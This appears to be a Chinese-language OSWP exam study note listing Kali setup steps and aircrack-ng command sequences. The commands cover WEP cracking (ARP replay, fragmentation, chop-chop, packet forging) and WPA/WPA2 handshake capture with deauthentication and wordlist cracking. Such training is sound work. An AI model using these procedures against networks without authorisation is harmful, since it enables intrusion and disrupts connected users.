# OSWP-Note

## 准备知识
更新 Kali
```
sudo apt update
sudo apt full-upgrade -y
```

安装对应框架程序
```
sudo apt install airmon-ng reaver hashcat hostapd dnsmasq nftables apache2 libapache2-mod-php freeradius
```

更新本地 Git 仓库
```
可以使用：
git pull origin master

或者：
git pull origin main
```

报告生成
```
OSCP考试报告模板
https://github.com/noraj/OSCP-Exam-Report-Template-Markdown

创建 Markdown 文件：
ruby osert.rb init

生成 PDF：
ruby osert.rb generate

```

列出 USB 设备信息
```
sudo lsusb -vv
lsusb
sudo airmon-ng
```

恢复正常网络连接（重启网络）
```
sudo service networking restart
sudo service NetworkManager restart
或者
service networking start
service network-manager start
```





## 路线图

连接VPN
```
openvpn 
```

连接到目标系统（通过 SSH）：
```
ssh <username>@<target_ip> -p<port> ## 使用提供的 SSH 信息连接到目标系统
```

扫描附近的无线网络：
```
iw dev wlan0 scan | grep SSID ## 检测在无线网卡（wlan0）范围内的无线网络
```

设置无线网卡为监视模式：
```
airmon-ng start wlan0 ## 将无线网卡（wlan0）设置为监视模式
```

监听周围的网络：
```
airodump-ng mon0 ## 通过监听网络（在监视模式下）检测周围的网络
```

更改无线网卡的频道：
```
iwconfig mon0 channel 3 ## 更改无线网卡所在的频道
```

查看无线网卡所在的频道：
```
iwlist mon0 channel ## 查看无线网卡所在的频道
```

监听目标 AP（访问点）：
```
airodump-ng -c 3 --bssid <AP_MAC> -w <capture_file> mon0 ## 在指定频道上监听目标 AP（使用 BSSID）并将数据包保存到捕获文件
```







## WEP
```
> WEP（有线等效隐私）攻击：

  **认证方式：OPN（开放认证）** 或 **SKA（共享密钥认证）**？

  > **认证方式：OPN（开放认证）**

    **是否有客户端连接到 AP（接入点）？**  
    **YES（是）** 或 **NO（否）**？

    > **YES（是）**：

      - ARP 请求重放攻击
      - 交互式数据包重放攻击
      - 去认证攻击（可以在两种情况下使用，即有或没有客户端连接）
  
    > **NO（否）**：

      - 伪造认证攻击（可以在两种情况下使用，即有或没有客户端连接）
      - 分片攻击
      - Korek ChopChop 攻击

  > **认证方式：SKA（共享密钥认证）**（绕过 WEP 共享密钥认证）：

    **如果有客户端连接到 AP，可以按照以下步骤进行攻击：**

     - 去认证攻击
     - 伪造共享密钥认证攻击
     - ARP 请求重放攻击
     - 去认证攻击
     - 使用 Aircrack-ng 破解 WEP 密钥
```
### ARP重放攻击（加速IV收集）
```
步骤1：开始捕获数据包：

airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon
第 2 步：虚假身份验证（如果需要）：

aireplay-ng -1 0 -a <BSSID> -h <your MAC> wlan0mon
步骤3：ARP重放攻击（注入ARP数据包以增加IV收集）：

aireplay-ng -3 -b <BSSID> -h <your MAC> wlan0mon
您将看到指示 ARP 数据包正在重放的消息。此攻击会增加捕获的弱 IV 的数量。

步骤 4：破解 WEP 密钥：

aircrack-ng <output file>.cap
```

### 碎片攻击
```
当没有可用的客户端时，碎片攻击很有用，您可以通过碎片数据包来破解 WEP 密钥。

步骤1：开始捕获数据包：

airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon
第 2 步：虚假身份验证（如果需要）：

aireplay-ng -1 0 -a <BSSID> -h <your MAC> wlan0mon
步骤3：执行碎片攻击：

aireplay-ng -5 -b <BSSID> -h <your MAC> wlan0mon
目标是捕获数据包并将其分段，从而生成密钥流数据。

步骤4：使用Packetforge-ng创建ARP数据包：

一旦您有了可用的密钥流，就可以用来packetforge-ng创建伪造的 ARP 请求：
packetforge-ng -0 -a <AP MAC> -h <your MAC> -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <arp_packet>
步骤5：注入ARP数据包：

aireplay-ng -2 -r <arp_packet> wlan0mon
步骤6：破解WEP密钥：

aircrack-ng <output file>.cap
```

### Chop-Chop 攻击
```
chop-chop 攻击可帮助您解密加密的 WEP 数据包的一个字节并获取密钥流。

步骤1：开始捕获数据包：

airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon
第 2 步：执行 Chop-Chop 攻击：

aireplay-ng -4 -b <BSSID> -h <your MAC> wlan0mon
您将捕获可用于伪造 ARP 数据包或执行解密的数据包的一部分。

步骤3：使用packetforge-ng创建ARP数据包：

使用获取的密钥流创建 ARP 请求：
packetforge-ng -0 -a <AP MAC> -h <your MAC> -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <arp_packet>
步骤4：注入ARP数据包：

aireplay-ng -2 -r <arp_packet> wlan0mon
步骤 5：破解 WEP 密钥：

aircrack-ng <output file>.cap
```


## WPA/WPA2

```
> WPA/WPA2

  ## 攻击：

    - 去认证攻击
  
  ## 破解网络密钥：

    - 使用 Aircrack-ng
    - 使用 JTR 和 Aircrack-ng
    - 使用 coWPAtty
    - 使用 Pyrit

```
### 攻击WPA/WPA2（PSK）
```
捕获 WPA 握手：

airodump-ng --bssid <BSSID> -c <channel> -w <output file> wlan0mon
取消对客户端的身份验证以强制重新进行身份验证：

aireplay-ng -0 5 -a <AP MAC> -c <Client MAC> wlan0mon
使用单词表破解 WPA/WPA2：

aircrack-ng -w <wordlist> <output file>.cap
推荐词汇表：rockyou.txt
```












